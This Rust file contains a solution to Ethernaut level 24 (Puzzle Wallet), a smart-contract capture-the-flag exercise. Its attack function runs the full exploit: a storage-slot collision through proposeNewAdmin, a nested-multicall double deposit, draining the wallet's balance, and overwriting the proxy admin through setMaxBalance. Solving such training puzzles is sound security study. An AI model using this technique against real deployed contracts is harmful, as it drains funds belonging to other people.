//! Ethernaut 24 — Puzzle Wallet.
//!
//! Goal: Become the `admin` of `PuzzleProxy`, the proxy that runs the
//! `PuzzleWallet` implementation.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/PuzzleWallet.sol
//!
//! The proxy's base implementation:
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/helpers/UpgradeableProxy-08.sol

use alloy::primitives::{B256, Bytes};
use alloy::providers::Provider;
use alloy::sol_types::SolCall;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl24_puzzle_wallet::PuzzleWallet::{
    depositCall, multicallCall,
};
use ctf::ethereum::ethernaut::lvl24_puzzle_wallet::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        // proposeNewAdmin to swap slot zero == become the owner of PuzzleWallet
        let wallet = PuzzleWallet::new(target.address, offender.provider());
        let proxy = PuzzleProxy::new(target.address, offender.provider());
        proxy.proposeNewAdmin(offender.address()).send().await?.watch().await?;
        wallet.addToWhitelist(offender.address()).send().await?.watch().await?;

        // double deposit
        let provider = offender.provider();
        let balance = provider.get_balance(target.address).await?;
        println!("Double depositing...");
        wallet
            .multicall(vec![
                multicallCall { data: vec![depositCall.abi_encode().into()] }
                    .abi_encode()
                    .into(),
                multicallCall { data: vec![depositCall.abi_encode().into()] }
                    .abi_encode()
                    .into(),
            ])
            .value(balance)
            .send()
            .await?
            .watch()
            .await?;

        // call execute to drain the wallet
        println!("Draining {balance} WEI from the wallet...");
        let balance = provider.get_balance(target.address).await?;
        wallet
            .execute(offender.address(), balance, Bytes::new())
            .send()
            .await?
            .watch()
            .await?;

        // setMaxBalance to offender
        let offender_balance =
            B256::left_padding_from(offender.address().as_slice());
        println!("Becoming the admin...");
        wallet
            .setMaxBalance(offender_balance.into())
            .send()
            .await?
            .watch()
            .await?;

        Ok(())
    }
}
